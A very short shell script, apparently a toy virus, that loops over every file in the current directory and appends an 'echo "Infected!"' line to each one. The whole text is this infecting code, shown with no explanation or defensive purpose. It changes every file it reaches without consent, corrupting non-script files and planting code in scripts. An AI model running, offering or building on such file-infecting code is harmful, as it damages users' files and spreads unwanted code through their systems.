scrlst=$(ls $(pwd))
for item in $scrlst
do
    echo -e "\necho \"Infected!\"" >> $item
done